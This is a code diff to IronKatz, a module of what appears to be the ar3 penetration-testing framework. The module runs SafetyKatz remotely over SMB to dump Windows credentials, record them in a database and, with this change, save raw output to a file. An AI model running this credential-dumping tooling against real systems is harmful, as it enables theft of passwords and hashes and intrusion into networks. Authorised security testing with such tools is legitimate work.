@@ -1,16 +1,19 @@
 import re
 from ar3.helpers import powershell
-from ar3.helpers.misc import get_local_ip
-from ar3.ops.enum.host_enum import code_execution
+from ar3.logger import setup_file_logger
 from ar3.helpers.misc import validate_ntlm
+from ar3.ops.enum.host_enum import code_execution
+from ar3.helpers.misc import get_local_ip, get_filestamp
+
 
 class IronKatz():
     def __init__(self):
-        self.name = 'Ironkatz'
-        self.description = 'Execute SafetyKatz using an embedded Iron Python Engine'
-        self.author = ['@m8r0wn']
-        self.credit = ['@byt3bl33d3r', '@harmj0y']
-        self.args = {}
+        self.name           = 'Ironkatz'
+        self.description    = 'Execute SafetyKatz using an embedded Iron Python Engine'
+        self.author         = ['@m8r0wn']
+        self.credit         = ['@byt3bl33d3r', '@harmj0y']
+        self.requires_admin = True
+        self.args           = {}
 
     def run(self, target, args, smb_con, loggers, config_obj):
         logger = loggers['console']
@@ -39,8 +42,7 @@ class IronKatz():
                 if not results:
                     loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), 'No output returned'])
                     return
-
-                if args.debug:
+                elif args.debug:
                     for line in results.splitlines():
                         loggers['console'].debug([smb_con.host, smb_con.ip, self.name.upper(), line])
 
@@ -57,6 +59,13 @@ class IronKatz():
                         loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(),"{}\\{}:{}".format(cred[1], cred[2], cred[3])])
                         db_updates += 1
                 loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), "{} credentials updated in database".format(db_updates)])
+
+                # write results to file
+                file_name = 'ironkatz_{}_{}.txt'.format(target, get_filestamp())
+                tmp_logger = setup_file_logger(args.workspace, file_name, ext='')
+                tmp_logger.info(results)
+                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), "Output saved to: {}".format(file_name)])
+
             except Exception as e:
                 if str(e) == "list index out of range":
                     loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), "{} failed".format(self.name)])
